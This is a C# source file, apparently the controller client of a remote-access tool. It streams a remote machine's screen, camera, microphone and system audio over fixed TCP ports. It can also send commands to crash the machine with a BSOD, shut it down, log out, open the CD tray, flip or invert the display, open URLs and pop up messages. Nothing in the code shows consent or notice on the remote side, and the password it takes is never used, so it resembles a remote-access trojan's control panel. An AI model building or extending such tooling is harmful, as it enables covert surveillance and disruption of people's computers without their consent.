using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NAudio.Wave;
using MessageBox = System.Windows.MessageBox;
using Image = System.Drawing.Image;
using Client2;
using System.Windows;
using Client2.Views.Pages;
using Newtonsoft.Json;
using System.Windows.Media.Imaging;

public class Connection
{
    public static string Ip { get; set; }
    public static int Port { get; set; }
    public static string Password { get; set; }

    public Page Page { get; }

    static MainWindow mainWindow = (MainWindow)Application.Current.MainWindow;

    public MainWindow Window { get; }

    public static event Action<Image> ScreenUpdated;
    public static event Action<Image> CameraUpdated;


    static TcpClient cameraClient;
    static NetworkStream cameraStream;

    static TcpClient client;
    static NetworkStream stream;


    static TcpClient comClient;
    static NetworkStream comStream;

    static WaveOutEvent waveOut;
    static TcpClient audioClient;
    static BufferedWaveProvider bufferedWaveProvider;

    private static CancellationTokenSource cancellationTokenSource;

    private bool MicImageSwitch = false;
    private bool SpeakerImageSwitch = false;
    private bool PauseImageSwitch = false;
    private bool PauseCamSwitch = false;
    static int CurremtCameraIndex = 1;

    private static int fps = 60;
    private static int compression = 100;

    public static SystemInfoList systemInfo;


    public Connection(string ip, int port, string password, Page page, MainWindow window)
    {
        Ip = ip;
        Port = port;
        Password = password;
        Page = page;
        Window = window;
        ConnectToServer();
    }

    public static async void ConnectToServer()
    {
        try
        {
            client = new TcpClient(Ip, 8888);  // for screen
            stream = client.GetStream();

            cameraClient = new TcpClient(Ip, 8890);  // for camera
            cameraStream = cameraClient.GetStream();

            comClient = new TcpClient(Ip, 8892);  // for commands
            comStream = comClient.GetStream();

            cancellationTokenSource = new CancellationTokenSource();


            await Task.WhenAll(
                Task.Run(() => ReceiveScreen(cancellationTokenSource.Token)),
                Task.Factory.StartNew(async () => 
                {
                    while (true)
                    {
                       await SendData(Console.ReadLine());
                    }
                }),
                //Task.Run(() => ReceiveCameraStream(cancellationTokenSource.Token)),
                Task.Run(() => ReceiveCommands(cancellationTokenSource.Token))
            );
        }
        catch (Exception ex)
        {
            await mainWindow.DialogError("Error connecting to server: ", ex.Message, CancellationToken.None);
            mainWindow.RootNavigation.Navigate(typeof(MainPage));
        }
    }


    public static async Task PlayAudio(bool toggle)
    {
        try
        {
            if (toggle)
            {
                audioClient = new TcpClient(Ip, 8889);
                Console.WriteLine("Connected to audio server.");

                waveOut = new WaveOutEvent();

                bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1)); // 44.1 kHz, mono
                waveOut.Init(bufferedWaveProvider);

                waveOut.Play();
                Console.WriteLine("Playing audio...");

                using (BinaryReader reader = new BinaryReader(audioClient.GetStream()))
                {
                    while (audioClient.Connected)
                    {
                        // Read the length of the audio data
                        int length = reader.ReadInt32();

                        // Read the audio data
                        byte[] audioData = reader.ReadBytes(length);

                        // Write the audio data to the BufferedWaveProvider
                        bufferedWaveProvider.AddSamples(audioData, 0, length);
                    }
                }
            }
            else
            {
                waveOut?.Stop();
                audioClient?.Close();
                audioClient ?.Dispose();
            }
        }
        catch { }

    }

    public static async Task PlaySytemAudio(bool toggle)
    {
        try
        {
            if (toggle)
            {
                audioClient = new TcpClient(Ip, 8891);
                Console.WriteLine("Connected to speaker server.");

                waveOut = new WaveOutEvent();

                bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1)); // 44.1 kHz, mono
                waveOut.Init(bufferedWaveProvider);

                waveOut.Play();
                Console.WriteLine("Playing audio...");

                using (BinaryReader reader = new BinaryReader(audioClient.GetStream()))
                {
                    while (audioClient.Connected)
                    {
                        // Read the length of the audio data
                        int length = reader.ReadInt32();

                        // Read the audio data
                        byte[] audioData = reader.ReadBytes(length);

                        // Write the audio data to the BufferedWaveProvider
                        bufferedWaveProvider.AddSamples(audioData, 0, length);
                    }
                }
            }
            else
            {
                waveOut?.Stop();
                audioClient ?.Close();
                audioClient?.Dispose();
            }
        }
        catch { }
    }

    public static async Task SendData(string stringData)
    {
        byte[] data = Encoding.UTF8.GetBytes(stringData);
        await Task.Run(() => SendDataByte(data));
    }

    public static async void SendDataByte(byte[] data)
    {
        try
        {
            if (comClient == null || !comClient.Connected)
            {
                ConnectToServer();
            }

            if (comClient != null && comClient.Connected)
            {
                comStream = comClient.GetStream();
                await comStream.WriteAsync(data, 0, data.Length);
                comStream.Flush(); // Flush the stream to send the data immediately
            }
            else
            {
                Console.WriteLine("Command clinet is not connected to the server.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error sending data to server: " + ex.Message);
        }
    }

    private static async Task ReceiveScreen(CancellationToken cancellationToken)
    {
        await SendData("resumeScreen");

        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {

                // Check if the stream is still readable
                if (!stream.CanRead)
                {
                    Console.WriteLine("Stream is no longer readable.");
                    break;
                }



                // Read the number of frames in the batch
                byte[] frameCountBytes = new byte[sizeof(int)];
                await stream.ReadAsync(frameCountBytes, 0, frameCountBytes.Length, cancellationToken);
                int frameCount = BitConverter.ToInt32(frameCountBytes, 0);

                // Process each frame in the batch
                for (int i = 0; i < frameCount; i++)
                {
                    // Read the frame size
                    byte[] sizeBytes = new byte[sizeof(int)];
                    await stream.ReadAsync(sizeBytes, 0, sizeBytes.Length, cancellationToken);
                    int imageSize = BitConverter.ToInt32(sizeBytes, 0);

                    // Read the frame data
                    byte[] imageData = new byte[imageSize];
                    int totalBytesRead = 0;
                    while (totalBytesRead < imageSize)
                    {
                        int bytesRead = await stream.ReadAsync(imageData, totalBytesRead, imageSize - totalBytesRead, cancellationToken);
                        if (bytesRead == 0)
                        {
                            throw new IOException("End of stream reached while reading image data.");
                        }
                        totalBytesRead += bytesRead;
                    }

                    // Create image from received data
                    using (MemoryStream ms = new MemoryStream(imageData))
                    {
                        ms.Position = 0; // Set stream position to beginning
                        Image screenshot = Image.FromStream(ms);
                        ScreenUpdated.Invoke(screenshot); // Update the screen image (invoke on UI thread)
                    }
                }

                await Task.Delay(1000 / fps, cancellationToken); // Adjust the interval as needed
            }
            catch (OperationCanceledException)
            {
                // Ignore cancellation and exit the loop
                break;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error receiving screen: " + ex.Message);
                break;
            }
        }

        // Clean up resources
        stream.Close();
        client.Close();
    }

    private async Task ReceiveCameraStream(CancellationToken cancellationToken)
    {
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                // Receive the size of the image first
                byte[] sizeBytes = new byte[4];
                await cameraStream.ReadAsync(sizeBytes, 0, sizeBytes.Length, cancellationToken);
                int imageSize = BitConverter.ToInt32(sizeBytes, 0);

                // Receive the image data
                byte[] imageData = new byte[imageSize];
                int totalBytesRead = 0;
                while (totalBytesRead < imageSize)
                {
                    int bytesRead = await cameraStream.ReadAsync(imageData, totalBytesRead, imageSize - totalBytesRead, cancellationToken);
                    if (bytesRead == 0)
                    {
                        throw new IOException("End of stream reached while reading camera data.");
                    }
                    totalBytesRead += bytesRead;
                }

                using (MemoryStream ms = new MemoryStream(imageData))
                {
                    ms.Position = 0;
                    Image cameraImage = Image.FromStream(ms);
                    CameraUpdated.Invoke(cameraImage);
                }
            }
            catch (OperationCanceledException)
            {
                // Ignore cancellation and exit the loop
                break;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error receiving camera stream: " + ex.Message);
                break;
            }
        }

        cameraStream.Close();
        cameraClient.Close();
    }

    private static async Task ReceiveCommands(CancellationToken cancellationToken)
    {
        try
        {
            byte[] buffer = new byte[8096];
            while (!cancellationToken.IsCancellationRequested)
            {
                int bytesRead = await comStream.ReadAsync(buffer, 0, buffer.Length);
                if (bytesRead > 0)
                {

                    string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine("Received command: " + receivedData);

                    if (receivedData.StartsWith("info"))
                    {
                        string jsonData = receivedData.Substring(4);
                        try
                        {
                            systemInfo = JsonConvert.DeserializeObject<SystemInfoList>(jsonData);

                            if (systemInfo != null)
                            {
                                await Application.Current.Dispatcher.BeginInvoke(() =>
                                {
                                    mainWindow.SetTitle(systemInfo.Title); // UI update happens immediately
                                });
                            }
                            else
                            {
                                Console.WriteLine("Failed to parse system info.");
                            }
                        }
                        catch (JsonException ex)
                        {
                            Console.WriteLine("Error deserializing system info: " + ex.Message);
                        }
                    }


                }


            }
        }
        catch (IOException ex) when (ex.InnerException is SocketException)
        {
            Console.WriteLine("Commands client disconnected.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error receiving commands: " + ex.Message);
        }
        finally
        {
            // Ensure proper cleanup
            if (stream != null)
            {
                stream.Close();
            }

            if (comClient != null && comClient.Connected)
            {
                comClient.Close();
            }
        }
    }

    public void ChangeFps(int _fps)
    {
        if (_fps == 0)
        {
            fps = 1;
            SendData("fps1");
        }
        else
        {
            fps = _fps;
            SendData("fps" + _fps.ToString());
            Thread.Sleep(100);
        }
    }

    public void Compression(int _compression)
    {
        if (_compression == 0)
        {
            compression = 1;
            SendData("compression1");
        }
        else
        {
            compression = _compression;
            SendData("compression1" + _compression.ToString());
            Thread.Sleep(100);
        }
    }

    public void ChangeCamera()
    {
        CurremtCameraIndex++;
        if (CurremtCameraIndex > 2)
        {
            CurremtCameraIndex = 1;
        }
        SendData("cam" + CurremtCameraIndex.ToString());
    }

    public void PauseCameraSwitch()
    {
        if (PauseCamSwitch)
        {
            SendData("resumeCam");
            PauseCamSwitch = false;
        }
        else
        {
            SendData("pauseCam");
            PauseCamSwitch = true;
        }
    }

    public void PauseScreenSwitch()
    {
        if (PauseImageSwitch)
        {
            SendData("resumeScreen");
            PauseImageSwitch = false;
        }
        else
        {
            SendData("pauseScreen");
            PauseImageSwitch = true;
        }
    }

    public void Mic(bool Switch)
    {
        if (Switch)
        {

            Task.Run(() => PlayAudio(true));
            MicImageSwitch = true;
        }
        else
        {
            Task.Run(() => PlayAudio(false));
            MicImageSwitch = false;
        }
    }

    public void Speaker(bool Switch)
    {
        if (Switch)
        {

            Task.Run(() => PlaySytemAudio(true));
            SpeakerImageSwitch = true;
        }
        else
        {
            Task.Run(() => PlaySytemAudio(false));
            SpeakerImageSwitch = false;
        }
    }

    public void Reconnect()
    {
        MicImageSwitch = false;
        Task.Run(() => PlayAudio(false));

        Task.Run(() => PlaySytemAudio(false));
        SpeakerImageSwitch = false;

        ConnectToServer();
    }

    public void Disconnect()
    {
        cancellationTokenSource.Cancel();
        MicImageSwitch = false;
        Task.Run(() => PlayAudio(false));

        Task.Run(() => PlaySytemAudio(false));
        SpeakerImageSwitch = false;
    }

    public async void OpenWeb()
    {
        string url = await mainWindow.DialogCreateUrl(CancellationToken.None);

        await SendData("openweb" + url);

    }

    public async void OpenCdTray()
    {
        await SendData("togglecd");
    }

    public async void SendBSOD()
    {
        if(await mainWindow.DialogBSOD(CancellationToken.None))
        {
            await SendData("bsod");

        }
    }

    public async void SendMsg() 
    {
        string msg = await mainWindow.DialogCreateMsgBox(CancellationToken.None);

         await SendData("msg" + msg);

    }

    public async void Shutdown()
    {
        if(await mainWindow.DialogShutdown(CancellationToken.None))
        {
            await SendData("shutdown");
        }
    }

    public async void Restart()
    {
        if(await mainWindow.DialogRestart(CancellationToken.None))
        {
            await SendData("restart");
        }
    }

    public async void Sleep()
    {
        await SendData("sleep");
    }

    public async void LogOut()
    {
        await SendData("logout");
    }

    public async void FlipScreen()
    {
        await SendData("flipScr");
    }

    public async void InvertScreen()
    {
        await SendData("invertScr");
    }


    public async Task<SystemInfoList> SysInfo()
    {
        await SendData("info");

        while(true)
        {
            if (systemInfo != null)
            {
                return systemInfo;
            }
            await Task.Delay(100);
        }
    }

}
